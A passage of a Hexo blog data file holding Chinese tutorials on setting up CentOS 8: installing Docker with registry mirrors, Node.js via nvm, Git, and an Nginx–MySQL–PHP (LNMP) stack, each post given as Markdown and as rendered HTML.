安装Docker引擎\n\n安装*最新版本*的Docker Engine和容器：\n\n```\n$ sudo yum install docker-ce docker-ce-cli containerd.io\n```\n\n如果提示接受GPG密钥，验证指纹是否匹配 060A 61C5 1B55 8A7F 742B 77AA C52F EB6B 621E 9F35，如果是，则接受。\n\n### 启动并设置开机运行Docker\n\n```\n$ sudo systemctl start docker\n$ sudo systemctl enable docker\n```\n\n### 升级Docker引擎\n\n重新安装一下即可\n\n## 0x02 配置镜像加速器\n\n首先执行以下命令，查看是否在 docker.service 文件中配置过镜像地址\n\n```\n$ systemctl cat docker | grep '\\-\\-registry\\-mirror'\n```\n\n如果以上命令没有任何输出，那么就可以在 /etc/docker/daemon.json 中写入如下内容（如果文件不存在新建该文件）：\n\n```\n{\n  \"registry-mirrors\": [\n    \"https://hub-mirror.c.163.com\",\n    \"https://mirror.baidubce.com\"\n  ]\n}\n```\n\n重新启动服务\n\n```\n$ sudo systemctl daemon-reload\n$ sudo systemctl restart docker\n```\n\n使用`docker info` 查看是否配置成功\n\n","source":"_posts/CentOS8下安装Docker.md","raw":"---\ntitle: CentOS8下安装Docker\ntoc: false\ndate: 2021-03-24 15:39:36\ndescription: CentOS8下安装Docker\ntags:\n - Docker\n - Linux\ncategories: Linux\n---\n\n## 0x01 使用存储库安装\n\n### 设置存储库\n\n安装yum-utils软件包并设置**稳定的**存储库。\n\n```\n$ sudo yum install -y yum-utils\n$ sudo yum-config-manager \\\n    --add-repo \\\n    https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo\n```\n\n### 安装Docker引擎\n\n安装*最新版本*的Docker Engine和容器：\n\n```\n$ sudo yum install docker-ce docker-ce-cli containerd.io\n```\n\n如果提示接受GPG密钥，验证指纹是否匹配 060A 61C5 1B55 8A7F 742B 77AA C52F EB6B 621E 9F35，如果是，则接受。\n\n### 启动并设置开机运行Docker\n\n```\n$ sudo systemctl start docker\n$ sudo systemctl enable docker\n```\n\n### 升级Docker引擎\n\n重新安装一下即可\n\n## 0x02 配置镜像加速器\n\n首先执行以下命令，查看是否在 docker.service 文件中配置过镜像地址\n\n```\n$ systemctl cat docker | grep '\\-\\-registry\\-mirror'\n```\n\n如果以上命令没有任何输出，那么就可以在 /etc/docker/daemon.json 中写入如下内容（如果文件不存在新建该文件）：\n\n```\n{\n  \"registry-mirrors\": [\n    \"https://hub-mirror.c.163.com\",\n    \"https://mirror.baidubce.com\"\n  ]\n}\n```\n\n重新启动服务\n\n```\n$ sudo systemctl daemon-reload\n$ sudo systemctl restart docker\n```\n\n使用`docker info` 查看是否配置成功\n\n","slug":"CentOS8下安装Docker","published":1,"updated":"2021-03-24T07:50:44.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9ni0006icswfbn9fs8k","content":"<h2 id=\"0x01-使用存储库安装\"><a href=\"#0x01-使用存储库安装\" class=\"headerlink\" title=\"0x01 使用存储库安装\"></a>0x01 使用存储库安装</h2><h3 id=\"设置存储库\"><a href=\"#设置存储库\" class=\"headerlink\" title=\"设置存储库\"></a>设置存储库</h3><p>安装yum-utils软件包并设置<strong>稳定的</strong>存储库。</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo yum install -y yum-utils</span><br><span class=\"line\">$ sudo yum-config-manager \\</span><br><span class=\"line\">    --add-repo \\</span><br><span class=\"line\">    https:<span class=\"regexp\">//mi</span>rrors.aliyun.com<span class=\"regexp\">/docker-ce/</span>linux<span class=\"regexp\">/centos/</span>docker-ce.repo</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装Docker引擎\"><a href=\"#安装Docker引擎\" class=\"headerlink\" title=\"安装Docker引擎\"></a>安装Docker引擎</h3><p>安装<em>最新版本</em>的Docker Engine和容器：</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo yum install docker-<span class=\"keyword\">ce</span> docker-<span class=\"keyword\">ce</span>-cli containerd.io</span><br></pre></td></tr></table></figure>\n\n<p>如果提示接受GPG密钥，验证指纹是否匹配 060A 61C5 1B55 8A7F 742B 77AA C52F EB6B 621E 9F35，如果是，则接受。</p>\n<h3 id=\"启动并设置开机运行Docker\"><a href=\"#启动并设置开机运行Docker\" class=\"headerlink\" title=\"启动并设置开机运行Docker\"></a>启动并设置开机运行Docker</h3><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$</span> sudo systemctl <span class=\"built_in\">start</span> docker</span><br><span class=\"line\"><span class=\"variable\">$</span> sudo systemctl enable docker</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"升级Docker引擎\"><a href=\"#升级Docker引擎\" class=\"headerlink\" title=\"升级Docker引擎\"></a>升级Docker引擎</h3><p>重新安装一下即可</p>\n<h2 id=\"0x02-配置镜像加速器\"><a href=\"#0x02-配置镜像加速器\" class=\"headerlink\" title=\"0x02 配置镜像加速器\"></a>0x02 配置镜像加速器</h2><p>首先执行以下命令，查看是否在 docker.service 文件中配置过镜像地址</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$</span> systemctl <span class=\"built_in\">cat</span> docker | grep <span class=\"string\">&#x27;\\-\\-registry\\-mirror&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>如果以上命令没有任何输出，那么就可以在 /etc/docker/daemon.json 中写入如下内容（如果文件不存在新建该文件）：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">&quot;registry-mirrors&quot;</span>: [</span><br><span class=\"line\">    <span class=\"string\">&quot;https://hub-mirror.c.163.com&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;https://mirror.baidubce.com&quot;</span></span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>重新启动服务</p>\n<figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$ </span>sudo systemctl daemon-reload</span><br><span class=\"line\"><span class=\"variable\">$ </span>sudo systemctl restart docker</span><br></pre></td></tr></table></figure>\n\n<p>使用<code>docker info</code> 查看是否配置成功</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"0x01-使用存储库安装\"><a href=\"#0x01-使用存储库安装\" class=\"headerlink\" title=\"0x01 使用存储库安装\"></a>0x01 使用存储库安装</h2><h3 id=\"设置存储库\"><a href=\"#设置存储库\" class=\"headerlink\" title=\"设置存储库\"></a>设置存储库</h3><p>安装yum-utils软件包并设置<strong>稳定的</strong>存储库。</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo yum install -y yum-utils</span><br><span class=\"line\">$ sudo yum-config-manager \\</span><br><span class=\"line\">    --add-repo \\</span><br><span class=\"line\">    https:<span class=\"regexp\">//mi</span>rrors.aliyun.com<span class=\"regexp\">/docker-ce/</span>linux<span class=\"regexp\">/centos/</span>docker-ce.repo</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装Docker引擎\"><a href=\"#安装Docker引擎\" class=\"headerlink\" title=\"安装Docker引擎\"></a>安装Docker引擎</h3><p>安装<em>最新版本</em>的Docker Engine和容器：</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo yum install docker-<span class=\"keyword\">ce</span> docker-<span class=\"keyword\">ce</span>-cli containerd.io</span><br></pre></td></tr></table></figure>\n\n<p>如果提示接受GPG密钥，验证指纹是否匹配 060A 61C5 1B55 8A7F 742B 77AA C52F EB6B 621E 9F35，如果是，则接受。</p>\n<h3 id=\"启动并设置开机运行Docker\"><a href=\"#启动并设置开机运行Docker\" class=\"headerlink\" title=\"启动并设置开机运行Docker\"></a>启动并设置开机运行Docker</h3><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$</span> sudo systemctl <span class=\"built_in\">start</span> docker</span><br><span class=\"line\"><span class=\"variable\">$</span> sudo systemctl enable docker</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"升级Docker引擎\"><a href=\"#升级Docker引擎\" class=\"headerlink\" title=\"升级Docker引擎\"></a>升级Docker引擎</h3><p>重新安装一下即可</p>\n<h2 id=\"0x02-配置镜像加速器\"><a href=\"#0x02-配置镜像加速器\" class=\"headerlink\" title=\"0x02 配置镜像加速器\"></a>0x02 配置镜像加速器</h2><p>首先执行以下命令，查看是否在 docker.service 文件中配置过镜像地址</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$</span> systemctl <span class=\"built_in\">cat</span> docker | grep <span class=\"string\">&#x27;\\-\\-registry\\-mirror&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>如果以上命令没有任何输出，那么就可以在 /etc/docker/daemon.json 中写入如下内容（如果文件不存在新建该文件）：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">&quot;registry-mirrors&quot;</span>: [</span><br><span class=\"line\">    <span class=\"string\">&quot;https://hub-mirror.c.163.com&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;https://mirror.baidubce.com&quot;</span></span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>重新启动服务</p>\n<figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$ </span>sudo systemctl daemon-reload</span><br><span class=\"line\"><span class=\"variable\">$ </span>sudo systemctl restart docker</span><br></pre></td></tr></table></figure>\n\n<p>使用<code>docker info</code> 查看是否配置成功</p>\n"},{"title":"CentOS8下安装Node.js和npm","toc":false,"date":"2021-03-24T07:37:29.000Z","description":"CentOS8下安装Node.js和npm","_content":"\nNode.js 是一个跨平台的 JavaScript 运行环境，简单的说 Node.js 就是运行在服务端的 JavaScript。使用 Node.js，你可以构建扩展的网络应用。\n\nNPM(Node Package Manager)是 Node.js 为了方便开发者使用和重用代码而开发的默认包管理器。它也是世界上用来发布开源 Node.js 包的最大软件仓库。\n\nNVM (Node Version Manager) 是一个 bash 脚本，它允许你管理多个 Node.js 版本。通过 NVM，你可以安装或者卸载任何你想要使用或者测试的 Node.js 版本。\n\n## NVM 的安装\n\n在NVM的GitHub网站上复制安装命令，更新的话重新输一下命令即可\n\n```\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.37.1/install.sh | bash\n```\n\n重新打开命令行即可使用nvm了\n\n## Node.js 和 npm 的安装\n\n运行以下命令安装最新的 Node.js 的 LTS 版本\n\n```\nnvm install --lts\n```\n\n列出所有已经安装的 Node.js 版本\n\n```\nnvm ls\n```\n\n改变当前可用的版本号\n\n```\nnvm use [版本号]\n```\n\n改变 Node.js 的默认版本\n\n```\nnvm alias default [版本号]\n```","source":"_posts/CentOS8下安装Node-js和npm.md","raw":"---\ntitle: CentOS8下安装Node.js和npm\ntoc: false\ndate: 2021-03-24 15:37:29\ndescription: CentOS8下安装Node.js和npm\ntags: Linux\ncategories: Linux\n---\n\nNode.js 是一个跨平台的 JavaScript 运行环境，简单的说 Node.js 就是运行在服务端的 JavaScript。使用 Node.js，你可以构建扩展的网络应用。\n\nNPM(Node Package Manager)是 Node.js 为了方便开发者使用和重用代码而开发的默认包管理器。它也是世界上用来发布开源 Node.js 包的最大软件仓库。\n\nNVM (Node Version Manager) 是一个 bash 脚本，它允许你管理多个 Node.js 版本。通过 NVM，你可以安装或者卸载任何你想要使用或者测试的 Node.js 版本。\n\n## NVM 的安装\n\n在NVM的GitHub网站上复制安装命令，更新的话重新输一下命令即可\n\n```\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.37.1/install.sh | bash\n```\n\n重新打开命令行即可使用nvm了\n\n## Node.js 和 npm 的安装\n\n运行以下命令安装最新的 Node.js 的 LTS 版本\n\n```\nnvm install --lts\n```\n\n列出所有已经安装的 Node.js 版本\n\n```\nnvm ls\n```\n\n改变当前可用的版本号\n\n```\nnvm use [版本号]\n```\n\n改变 Node.js 的默认版本\n\n```\nnvm alias default [版本号]\n```","slug":"CentOS8下安装Node-js和npm","published":1,"updated":"2021-03-24T07:37:52.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9nj0007icsw5o7r86c2","content":"<p>Node.js 是一个跨平台的 JavaScript 运行环境，简单的说 Node.js 就是运行在服务端的 JavaScript。使用 Node.js，你可以构建扩展的网络应用。</p>\n<p>NPM(Node Package Manager)是 Node.js 为了方便开发者使用和重用代码而开发的默认包管理器。它也是世界上用来发布开源 Node.js 包的最大软件仓库。</p>\n<p>NVM (Node Version Manager) 是一个 bash 脚本，它允许你管理多个 Node.js 版本。通过 NVM，你可以安装或者卸载任何你想要使用或者测试的 Node.js 版本。</p>\n<h2 id=\"NVM-的安装\"><a href=\"#NVM-的安装\" class=\"headerlink\" title=\"NVM 的安装\"></a>NVM 的安装</h2><p>在NVM的GitHub网站上复制安装命令，更新的话重新输一下命令即可</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -o- https:<span class=\"regexp\">//</span>raw.githubusercontent.com<span class=\"regexp\">/nvm-sh/</span>nvm<span class=\"regexp\">/v0.37.1/i</span>nstall.sh | bash</span><br></pre></td></tr></table></figure>\n\n<p>重新打开命令行即可使用nvm了</p>\n<h2 id=\"Node-js-和-npm-的安装\"><a href=\"#Node-js-和-npm-的安装\" class=\"headerlink\" title=\"Node.js 和 npm 的安装\"></a>Node.js 和 npm 的安装</h2><p>运行以下命令安装最新的 Node.js 的 LTS 版本</p>\n<figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nvm install <span class=\"comment\">--lts</span></span><br></pre></td></tr></table></figure>\n\n<p>列出所有已经安装的 Node.js 版本</p>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">nvm ls</span></span><br></pre></td></tr></table></figure>\n\n<p>改变当前可用的版本号</p>\n<figure class=\"highlight actionscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nvm <span class=\"keyword\">use</span> [版本号]</span><br></pre></td></tr></table></figure>\n\n<p>改变 Node.js 的默认版本</p>\n<figure class=\"highlight ceylon\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nvm <span class=\"keyword\">alias</span> <span class=\"keyword\">default</span> [版本号]</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<p>Node.js 是一个跨平台的 JavaScript 运行环境，简单的说 Node.js 就是运行在服务端的 JavaScript。使用 Node.js，你可以构建扩展的网络应用。</p>\n<p>NPM(Node Package Manager)是 Node.js 为了方便开发者使用和重用代码而开发的默认包管理器。它也是世界上用来发布开源 Node.js 包的最大软件仓库。</p>\n<p>NVM (Node Version Manager) 是一个 bash 脚本，它允许你管理多个 Node.js 版本。通过 NVM，你可以安装或者卸载任何你想要使用或者测试的 Node.js 版本。</p>\n<h2 id=\"NVM-的安装\"><a href=\"#NVM-的安装\" class=\"headerlink\" title=\"NVM 的安装\"></a>NVM 的安装</h2><p>在NVM的GitHub网站上复制安装命令，更新的话重新输一下命令即可</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -o- https:<span class=\"regexp\">//</span>raw.githubusercontent.com<span class=\"regexp\">/nvm-sh/</span>nvm<span class=\"regexp\">/v0.37.1/i</span>nstall.sh | bash</span><br></pre></td></tr></table></figure>\n\n<p>重新打开命令行即可使用nvm了</p>\n<h2 id=\"Node-js-和-npm-的安装\"><a href=\"#Node-js-和-npm-的安装\" class=\"headerlink\" title=\"Node.js 和 npm 的安装\"></a>Node.js 和 npm 的安装</h2><p>运行以下命令安装最新的 Node.js 的 LTS 版本</p>\n<figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nvm install <span class=\"comment\">--lts</span></span><br></pre></td></tr></table></figure>\n\n<p>列出所有已经安装的 Node.js 版本</p>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">nvm ls</span></span><br></pre></td></tr></table></figure>\n\n<p>改变当前可用的版本号</p>\n<figure class=\"highlight actionscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nvm <span class=\"keyword\">use</span> [版本号]</span><br></pre></td></tr></table></figure>\n\n<p>改变 Node.js 的默认版本</p>\n<figure class=\"highlight ceylon\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nvm <span class=\"keyword\">alias</span> <span class=\"keyword\">default</span> [版本号]</span><br></pre></td></tr></table></figure>"},{"title":"CentOS8下安装Git","toc":false,"date":"2021-03-24T07:38:16.000Z","description":"CentOS8下安装Git","_content":"\n一行命令即可\n\n```\nsudo yum install git-core\n```\n\n","source":"_posts/CentOS8下安装Git.md","raw":"---\ntitle: CentOS8下安装Git\ntoc: false\ndate: 2021-03-24 15:38:16\ndescription: CentOS8下安装Git\ntags: Linux\ncategories: Linux\n---\n\n一行命令即可\n\n```\nsudo yum install git-core\n```\n\n","slug":"CentOS8下安装Git","published":1,"updated":"2021-03-24T07:38:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9nk000bicswc9mph37b","content":"<p>一行命令即可</p>\n<figure class=\"highlight cmake\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo yum <span class=\"keyword\">install</span> git-core</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<p>一行命令即可</p>\n<figure class=\"highlight cmake\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo yum <span class=\"keyword\">install</span> git-core</span><br></pre></td></tr></table></figure>\n\n"},{"title":"CentOS8下搭建LNMP","toc":false,"date":"2021-03-24T07:36:35.000Z","description":"CentOS8下搭建LNMP","_content":"\n## 安装和配置 Nginx\n\n1. 安装 Nginx\n\n以安装 Nginx 1.18.0 为例，可通过 [Ngingx 官方安装包](http://nginx.org/packages/centos/8/x86_64/RPMS/?spm=a2c4g.11186623.2.31.557423bfYPMd6u) 获取适用于 CentOS 8的更多版本。\n\n```\ndnf -y install http://nginx.org/packages/centos/8/x86_64/RPMS/nginx-1.18.0-1.el8.ngx.x86_64.rpm\n```\n\n2. 查看 Nginx 版本\n\n```\nnginx -v\n```\n\n3. 查看 Nginx 配置文件路径\n\n```\ncat /etc/nginx/nginx.conf\n```\n\ninclude 配置项的 /etc/nginx/conf.d/*.conf 即为 Nginx 配置文件的默认路径\n\n4. 在配置文件默认路径下进行备份\n\n```\ncd /etc/nginx/conf.d\ncp default.conf *.conf\n```\n\n5. 打开 *.conf 文件\n\n```\nvim *.conf\n```\n\n6. 编辑 default.conf 文件\n\n- 在 location 的 index 项中添加 index.php\n\n- 删除 location ~ .php$ 大括号前的 #，并修改以下配置项：\n\n- - 修改 root 项为网站根目录，即 location 中的 root 项，本文以 /usr/share/nginx/html; 为例\n  - 修改 fastcgi_pass 项为 unix:/run/php-fpm/www.sock;\n  - 将 fastcgi_param SCRIPT_FILENAME 后的 /scripts$fastcgi_script_name; 替换为 $document_root$fastcgi_script_name;\n\n```\nlocation ~ \\.php$ {\n    root          /usr/share/nginx/html;\n    fastcgi_pass  unix:/run/php-fpm/www.sock;\n    fastcgi_index index.php;\n    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n    include       fastcgi_params;\n}\n```\n\n7. 启动Nginx并设置为开机自启动并查看状态\n\n```\nsystemctl start nginx\nsystemctl enable nginx\nsystemctl status nginx\n```\n\n## 安装和配置MySQL\n\n1. 安装 MySQL\n\n```\ndnf -y install @mysql\n```\n\n2. 查看 MySQL 版本\n\n```\nmysql -V\n```\n\n3. 启动 MySQL 并设置为开机自启动并查看状态\n\n```\nsystemctl start mysqld\nsystemctl enable mysqld\nsystemctl status mysqld\n```\n\n4. 执行 MySQL 安全性操作并设置密码\n\n```\nmysql_secure_installation\n```\n\n按照以下步骤，执行对应操作：\n\n- 输入 y 并按 **Enter** 开始相关配置。\n\n- 选择密码验证策略强度，建议选择高强度的密码验证策略。输入 2 并按 **Enter**。\n\n- - 0：表示低。\n  - 1：表示中。\n  - 2：表示高。\n\n- 设置 MySQL 密码并按 **Enter** ，输入密码默认不显示。\n\n- 再次输入密码并按 **Enter**，输入 y 确认设置该密码。\n\n- 输入 y 并按 **Enter**，移除匿名用户。\n\n- 设置是否禁止远程连接 MySQL：\n\n- - 禁止远程连接：输入 y 并按 **Enter**。\n  - 允许远程连接：输入 n 并按 **Enter**。\n\n- 输入 y 并按 **Enter**，删除 test 库及对 test 库的访问权限。\n\n- 输入 y 并按 **Enter**，重新加载授权表。\n\n## 安装和配置PHP\n\n1. 添加并更新 epel 源\n\n```\ndnf -y install epel-release\ndnf update epel-release\n```\n\n2. 删除缓存的无用软件包并更新软件源\n\n```\ndnf clean all\ndnf makecache\n```\n\n3. 安装 remi 源\n\n```\ndnf -y install https://rpms.remirepo.net/enterprise/remi-release-8.rpm\n```\n\n4. 启动 PHP 7.4 模块\n\n```\ndnf module install php:remi-7.4\n```\n\n5. 安装所需 PHP 对应模块\n\n```\ndnf install php php-curl php-dom php-exif php-fileinfo php-fpm php-gd php-hash php-json php-mbstring php-mysqli php-openssl php-pcre php-xml libsodium\n```\n\n6. 查看 PHP 版本\n\n```\nphp -v\n```\n\n7. 打开 www.conf 文件\n\n```\nvi /etc/php-fpm.d/www.conf\n```\n\n8. 将 user = apache 及 group = apache 修改为 user = nginx 及 group = nginx\n9. 启动 PHP-FPM 并设置为开机自启动并查看状态\n\n```\nsystemctl start php-fpm\nsystemctl enable php-fpm\nsystemctl status php-fpm\n```\n\n## 验证环境配置\n\n/usr/share/nginx/html 为 Nginx 中已配置的网站根目录\n\n1. 创建测试文件\n\n```\necho \"<?php phpinfo(); ?>\" >> /usr/share/nginx/html/index.php\n```\n\n2. 在本地浏览器中访问服务器公网IP，查看环境配置是否成功\n\n```\nhttp://云服务器实例的公网 IP/index.php\n```\n\n","source":"_posts/CentOS8下搭建LNMP.md","raw":"---\ntitle: CentOS8下搭建LNMP\ntoc: false\ndate: 2021-03-24 15:36:35\ndescription: CentOS8下搭建LNMP\ntags: Linux\ncategories: Linux\n---\n\n## 安装和配置 Nginx\n\n1. 安装 Nginx\n\n以安装 Nginx 1.18.0 为例，可通过 [Ngingx 官方安装包](http://nginx.org/packages/centos/8/x86_64/RPMS/?spm=a2c4g.11186623.2.31.557423bfYPMd6u) 获取适用于 CentOS 8的更多版本。\n\n```\ndnf -y install http://nginx.org/packages/centos/8/x86_64/RPMS/nginx-1.18.0-1.el8.ngx.x86_64.rpm\n```\n\n2. 查看 Nginx 版本\n\n```\nnginx -v\n```\n\n3. 查看 Nginx 配置文件路径\n\n```\ncat /etc/nginx/nginx.conf\n```\n\ninclude 配置项的 /etc/nginx/conf.d/*.conf 即为 Nginx 配置文件的默认路径\n\n4. 在配置文件默认路径下进行备份\n\n```\ncd /etc/nginx/conf.d\ncp default.conf *.conf\n```\n\n5. 打开 *.conf 文件\n\n```\nvim *.conf\n```\n\n6. 编辑 default.conf 文件\n\n- 在 location 的 index 项中添加 index.php\n\n- 删除 location ~ .php$ 大括号前的 #，并修改以下配置项：\n\n- - 修改 root 项为网站根目录，即 location 中的 root 项，本文以 /usr/share/nginx/html; 为例\n  - 修改 fastcgi_pass 项为 unix:/run/php-fpm/www.sock;\n  - 将 fastcgi_param SCRIPT_FILENAME 后的 /scripts$fastcgi_script_name; 替换为 $document_root$fastcgi_script_name;\n\n```\nlocation ~ \\.php$ {\n    root          /usr/share/nginx/html;\n    fastcgi_pass  unix:/run/php-fpm/www.sock;\n    fastcgi_index index.php;\n    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n    include       fastcgi_params;\n}\n```\n\n7. 启动Nginx并设置为开机自启动并查看状态\n\n```\nsystemctl start nginx\nsystemctl enable nginx\nsystemctl status nginx\n```\n\n## 安装和配置MySQL\n\n1. 安装 MySQL\n\n```\ndnf -y install @mysql\n```\n\n2. 查看 MySQL 版本\n\n```\nmysql -V\n```\n\n3. 启动 MySQL 并设置为开机自启动并查看状态\n\n```\nsystemctl start mysqld\nsystemctl enable mysqld\nsystemctl status mysqld\n```\n\n4. 执行 MySQL 安全性操作并设置密码\n\n```\nmysql_secure_installation\n```\n\n按照以下步骤，执行对应操作：\n\n- 输入 y 并按 **Enter** 开始相关配置。\n\n- 选择密码验证策略强度，建议选择高强度的密码验证策略。输入 2 并按 **Enter**。\n\n- - 0：表示低。\n  - 1：表示中。\n  - 2：表示高。\n\n- 设置 MySQL 密码并按 **Enter** ，输入密码默认不显示。\n\n- 再次输入密码并按 **Enter**，输入 y 确认设置该密码。\n\n- 输入 y 并按 **Enter**，移除匿名用户。\n\n- 设置是否禁止远程连接 MySQL：\n\n- - 禁止远程连接：输入 y 并按 **Enter**。\n  - 允许远程连接：输入 n 并按 **Enter**。\n\n- 输入 y 并按 **Enter**，删除 test 库及对 test 库的访问权限。\n\n- 输入 y 并按 **Enter**，重新加载授权表。\n\n## 安装和配置PHP\n\n1. 添加并更新 epel 源\n\n```\ndnf -y install epel-release\ndnf update epel-release\n```\n\n2. 删除缓存的无用软件包并更新软件源\n\n```\ndnf clean all\ndnf makecache\n```\n\n3. 安装 remi 源\n\n```\ndnf -y install https://rpms.remirepo.net/enterprise/remi-release-8.rpm\n```\n\n4. 启动 PHP 7.4 模块\n\n```\ndnf module install php:remi-7.4\n```\n\n5. 安装所需 PHP 对应模块\n\n```\ndnf install php php-curl php-dom php-exif php-fileinfo php-fpm php-gd php-hash php-json php-mbstring php-mysqli php-openssl php-pcre php-xml libsodium\n```\n\n6. 查看 PHP 版本\n\n```\nphp -v\n```\n\n7. 打开 www.conf 文件\n\n```\nvi /etc/php-fpm.d/www.conf\n```\n\n8. 将 user = apache 及 group = apache 修改为 user = nginx 及 group = nginx\n9. 启动 PHP-FPM 并设置为开机自启动并查看状态\n\n```\nsystemctl start php-fpm\nsystemctl enable php-fpm\nsystemctl status php-fpm\n```\n\n## 验证环境配置\n\n/usr/share/nginx/html 为 Nginx 中已配置的网站根目录\n\n1. 创建测试文件\n\n```\necho \"<?php phpinfo(); ?>\" >> /usr/share/nginx/html/index.php\n```\n\n2. 在本地浏览器中访问服务器公网IP，查看环境配置是否成功\n\n```\nhttp://云服务器实例的公网 IP/index.php\n```\n\n","slug":"CentOS8下搭建LNMP","published":1,"updated":"2021-03-24T07:37:06.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9nl000cicsw9sdjabjt","content":"<h2 id=\"安装和配置-Nginx\"><a href=\"#安装和配置-Nginx\" class=\"headerlink\" title=\"安装和配置 Nginx\"></a>安装和配置 Nginx</h2><ol>\n<li>安装 Nginx</li>\n</ol>\n<p>以安装 Nginx 1.18.0 为例，可通过 <a href=\"http://nginx.org/packages/centos/8/x86_64/RPMS/?spm=a2c4g.11186623.2.31.557423bfYPMd6u\">Ngingx 官方安装包</a> 获取适用于 CentOS 8的更多版本。</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">dnf</span> -y install http://nginx.org/packages/centos/<span class=\"number\">8</span>/x<span class=\"number\">86</span>_<span class=\"number\">64</span>/RPMS/nginx-<span class=\"number\">1</span>.<span class=\"number\">18</span>.<span class=\"number\">0</span>-<span class=\"number\">1</span>.el<span class=\"number\">8</span>.ngx.x<span 